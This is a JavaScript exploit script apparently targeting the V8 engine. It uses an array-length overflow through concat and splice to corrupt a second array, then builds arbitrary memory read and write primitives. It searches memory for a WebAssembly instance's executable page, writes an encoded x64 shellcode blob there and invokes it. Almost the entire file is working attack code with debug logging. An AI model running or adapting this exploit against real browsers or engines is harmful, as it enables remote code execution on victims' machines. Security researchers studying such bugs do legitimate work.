var buf = new ArrayBuffer(8); 
var f64_buf = new Float64Array(buf);
var u64_buf = new Uint32Array(buf);

// https://wasdk.github.io/WasmFiddle/
var wasm_code = new Uint8Array([0,97,115,109,1,0,0,0,1,133,128,128,128,0,1,96,0,1,127,3,130,128,128,128,0,1,0,4,132,128,128,128,0,1,112,0,0,5,131,128,128,128,0,1,0,1,6,129,128,128,128,0,0,7,145,128,128,128,0,2,6,109,101,109,111,114,121,2,0,4,109,97,105,110,0,0,10,138,128,128,128,0,1,132,128,128,128,0,0,65,42,11]);
var wasm_mod = new WebAssembly.Module(wasm_code);
var wasm_instance = new WebAssembly.Instance(wasm_mod);
var f = wasm_instance.exports.main;
var obj_array = [0xdeadbee,0xdeadbee,0xbadbeef,0xbadbeef,wasm_instance,wasm_instance,0xbadc0de,0xbadc0de];


var shellcode = [ 72,49,201,72,129,233,221,255,255,255,72,141,5,239,255,255,255,72,
  187,4,184,106,12,166,239,232,8,72,49,88,39,72,45,248,255,255,255,
  226,244,248,240,233,232,86,7,40,8,4,184,43,93,231,191,186,89,82,
  240,91,222,195,167,99,90,100,240,225,94,190,167,99,90,36,240,225,
  126,246,167,231,191,78,242,39,61,111,167,217,200,168,132,11,112,164,
  195,200,73,197,113,103,77,167,46,10,229,86,249,59,68,45,189,200,131,
  70,132,34,13,118,100,104,128,4,184,106,68,35,47,156,111,76,185,186,
  92,45,167,240,76,143,248,74,69,167,63,11,94,76,71,163,77,45,219,96,
  64,5,110,39,61,111,167,217,200,168,249,171,197,171,174,233,201,60,
  88,31,253,234,236,164,44,12,253,83,221,211,55,176,76,143,248,78,69,
  167,63,142,73,143,180,34,72,45,175,244,65,5,104,43,135,162,103,160,
  9,212,249,50,77,254,177,177,82,69,224,43,85,231,181,160,139,232,152,
  43,94,89,15,176,73,93,226,34,135,180,6,191,247,251,71,55,68,28,238,
  232,8,4,184,106,12,166,167,101,133,5,185,106,12,231,85,217,131,107,
  63,149,217,29,31,93,170,82,249,208,170,51,82,117,247,209,240,233,200,
  142,211,238,116,14,56,145,236,211,234,83,79,23,202,5,102,166,182,169,
  129,222,71,191,111,199,131,139,38,97,192,15,12,166,239,232,8];

// helper functions
function ftoi(val) { // typeof(val) = float
  f64_buf[0] = val;
  return BigInt(u64_buf[0]) + (BigInt(u64_buf[1]) << 32n); // Watch for little endianness
}
function itof(val) { // typeof(val) = BigInt
  u64_buf[0] = Number(val & 0xffffffffn);
  u64_buf[1] = Number(val >> 32n);
  return f64_buf[0];
}
// HOLEY_DOUBLE_ELEMENTS kind, size=0x40000, filled with 1.1's
array = Array(0x40000).fill(1.1);

// Total number of elements in `args`: 0x40000 * 0xff = 0x3fc0000
args = Array(0x100 - 1).fill(array);

// We want a size that's just less than FixedDoubleArray::kMaxLength = 0x3ffffe
// This new array that is pushed onto `args` can actually have a maximum size 
// of (0x40000 - 2), but Sergey chooses to use (0x40000 - 4)
// Total number of elements in `args`: 0x3fc0000 + 0x3fffc = 0x3fffffc
args.push(Array(0x40000 - 4).fill(2.2));

// `Array.prototype.concat` fast path, the length check passes as the final
// length of `giant_array` becomes 0x3fffffc, which is equal to
// `FixedDoubleArray::kMaxLength - 2`
giant_array = Array.prototype.concat.apply([], args);

// No length check on `Array.prototype.splice`, `giant_array.length` is now
// 0x3ffffff, which is `FixedDoubleArray::kMaxLength + 1`
giant_array.splice(giant_array.length, 0, 3.3, 3.3, 3.3);

arrayBuffer = new ArrayBuffer(0xbeef) // size must not be large

length_as_double =
    new Float64Array(new BigUint64Array([0x2424242400000001n]).buffer)[0];  // we're overwriting length as 64 bit value, because the
                                                                            // currupting_array is HOLEY_DOUBLE_ELEMENTS and expect
                                                                            // float value, that's why length is set as double

function trigger(array) {
  var x = array.length;
  x -= 67108861;
  x = Math.max(x, 0);
  x *= 6;
  x -= 5;
  x = Math.max(x, 0); // [1]

  let corrupting_array = [0.1, 0.1];
  let corrupted_array = [0.1];

  corrupting_array[x] = length_as_double;
  return [corrupting_array, corrupted_array];
}

for (let i = 0; i < 30000; ++i) {
  trigger(giant_array);
}

corrupted_array = trigger(giant_array)[1]

function addrOf(obj) {

}


backing_store_index = 0;
// var searchmem_space = [[(0x8040000)/8,(0x805d000/8)-1], 
//                 // [0x818d000/8,(0x83c0000/8)-1], 
//                 [0x83c0000/8,(0x86c1000/8)-1], 
//                 [0x8700000 + 8/8,(0x8940000/8)-1], 
//                 [0x8ac0000/8,(0x9081000/8)-1],
//                 [0x90c0000/8,(0x90c1000/8)-1],
//                 [0x9100000/8,(0x29101000/8)-1]
//               ]

var searchmem_space = [
                     [(0x8901000+8)/8, (0x8908668/8)],
                     [0x8908668/8, (0x8940000/8)-1],
                     [0x8200000/8, (0x8280000/8)-1],
                     [0x88C38d0/8, (0x8900000/8)],
                     [(0x8040000)/8, (0x805d000/8)-1],
                     [(0x8080000 + 8)/8, (0x818d000/8)-1],
                     [0x88693D0/8, (0x88c3868/8)-1],
                     [0x83c0000/8, (0x86c1000/8)-1],    
                     [(0x8ac0000+8)/8, (0x9081000/8)-1],               
                      [(0x8700000+8)/8, (0x88693c8/8)-1],
                      []
                      
                      ]
                      //  [0x90c0000/8, (0x290c1000/8)-1]];


function SearchMem(val) {
  // skip = 0;
  for(i = 0; i < searchmem_space.length; i++) {
    console.log("[*] Searching in memory: "+(searchmem_space[i][0]*8).toString(16) +" - "+(searchmem_space[i][1]*8).toString(16))
    for(j = searchmem_space[i][0]; j < searchmem_space[i][1]; j++) {
      if(((ftoi(corrupted_array[j])>>32n) === val) || 
        (((ftoi(corrupted_array[j])) & 0xffffffffn) === val)) {
          // if (skip++ == 2) {
            return j;
          // }
        }
    }
  }
  return -1;
}

function SearchWasmInMemory(val) {
  skip = 0;
  for (i = 0; i < searchmem_space.length; i++) {
    console.log("[*] Searching in memory: "+(searchmem_space[i][0]*8).toString(16) +" - "+(searchmem_space[i][1]*8).toString(16))
    for(j = searchmem_space[i][0]; j < searchmem_space[i][1];j++) {
      if((ftoi(corrupted_array[j])===val)) {
        if((((ftoi(corrupted_array[j+2]) >> 56n)& 0xffn) == 8n) && 
          (((ftoi(corrupted_array[j+2]) >> 24n)& 0xffn) == 8n)) {
            return j;
          }
      }
    }
  }
  return -1
}

function SearchWasmGod(val) {
  for (i = 0; i < searchmem_space.length; i++) {
    console.log("[*] Searching in memory: "+(searchmem_space[i][0]*8).toString(16) +" - "+(searchmem_space[i][1]*8).toString(16))
    for(j = searchmem_space[i][0]; j < searchmem_space[i][1];j++) {
      if((ftoi(corrupted_array[j])===val)) {
          return j;
      }
    }
  }
  return -1
}

backing_store_index = SearchMem(48879n)
console.log("[*] backing_store_index found: "+backing_store_index)

if(backing_store_index == -1) {
  console.log("index not found")
  throw new Error("index not found")

}
// 20149000n => 0x133708
// 200211438n => 0xbeefbee
// 48879n => 0xbeef
var data_view = new DataView(arrayBuffer);
function arb_read(addr, length) {
  var data = [];
  let u8_arrBuffer = new Uint8Array(arrayBuffer)
  corrupted_array[backing_store_index+1] = itof(addr)
  for(i = 0; i< length;++i) {
    data.push(u8_arrBuffer[i])
  }
  return data;
}


function arb_write(addr, data) {
  corrupted_array[backing_store_index+1] = itof(addr)
  // let u8_arrBuffer = new Uint8Array(arrayBuffer)
  // for (i =0; i<data.length; i++) {
  //   u8_arrBuffer[i] = data[i]
  // }
  for(i = 0; i < data.length; i++) {
    data_view.setUint8(i, data[i])
  }
}



// load('C:\\Users\\johns\\Documents\\shared folder\\d8\\poc.js')
// wasm_idx = SearchWasmInMemory()
// 173078952911758946n = "266e6640266e662"
// 7414732620576194824n = 
//SearchWasmInMemory(7414725997014443010n)

console.log("[*] Searching Wasm Address...")
wasm_idx = SearchWasmInMemory(1683077278656215004n)
console.log("[*] Calculating Wasm Address : ")
wasm_addr = ftoi(corrupted_array[wasm_idx+2]) & 0xffffffffn

if (wasm_addr > 0) {
  console.log("[*] Found Wasm Address : "+wasm_addr.toString(16))
} else {
  console.log("[*] Failed to find wasm address, running god mode...")
}
search_str = [ 1683077278581095902n, 1683077278656215004n]
if (wasm_addr <=10) {
  for(i = 0; i < search_str.length; i++) {
    console.log("[*] Searching Wasm Address attempt : "+i)
    wasm_idx = SearchWasmGod(search_str[i])
    console.log("[*] Calculating Wasm Address, idx : "+wasm_idx)
    // wasm_addr = ((ftoi(corrupted_array[wasm_idx+1])>>40n)+0x8000000n) & 0xffffffffn
    wasm_addr = ((ftoi(corrupted_array[wasm_idx+1])>>32n)) & 0xffffffffn
    if(wasm_addr != 0x8000000n || wasm_addr != 0 ||  wasm_idx != -1) {
      console.log("[*] Found Wasm Address : "+wasm_addr.toString(16))
      break;
    }
  }
  
} 
if(wasm_addr === 0x8000000n) {
  throw new Error("[*] Failed to find wasm address")
}


// rwx_index = Number(corrupted_array[((wasm_addr-1n)+0x68n)/0x8n])
// rwx_addr = ftoi(corrupted_array[rwx_index-1])
rwx_index = 0
rwx_addr = 0
rwx_addr_fixed = 0
f_rwx_addr = 0
l_rwx_addr = 0
if((rwx_addr & 0xffffffff) <= 0) {
  console.log("[*] Finding rwx in god mode...")
  wasm_idx_fix = Math.round(Number(wasm_addr)/8)
  wasm_addr_fix = (wasm_idx_fix-1)+(0x68/0x8)
  rwx_index = wasm_addr_fix
  console.log("[*] Found rwx Index in god mode : "+rwx_index)
  rwx_addr = ftoi(corrupted_array[wasm_addr_fix])
  f_rwx_addr = (ftoi(corrupted_array[Number(wasm_addr_fix)]) << 32n) & 0xffffffffffffn
  l_rwx_addr = (ftoi(corrupted_array[Number(wasm_addr_fix-1)]) >> 32n) & 0xffffffffn
  rwx_addr_fixed = f_rwx_addr + l_rwx_addr
  // first_part = (ftoi(corrupted_array[rwx_index-1]) >> 40n) & 0xffffffffn
  console.log("[*] Found rwx Address in god mode : "+rwx_addr.toString(16))
  console.log("[*] Fixed rwx Address in god mode : "+rwx_addr_fixed.toString(16))
}else {
  console.log("[*] Found rwx Address in normal mode : "+rwx_addr.toString(16))
}

arb_write(rwx_addr_fixed,shellcode)
f();

// console.log("wasm address: "+wasm_addr.toString(16))

// ((ftoi(corrupted_array[Number(wasm_addr_fix)]) << 32n) & 0xffffffffffffn).toString(16)
// ((ftoi(corrupted_array[Number(wasm_addr_fix+1)]) >> 32n) & 0xffffffffffffn).toString(16)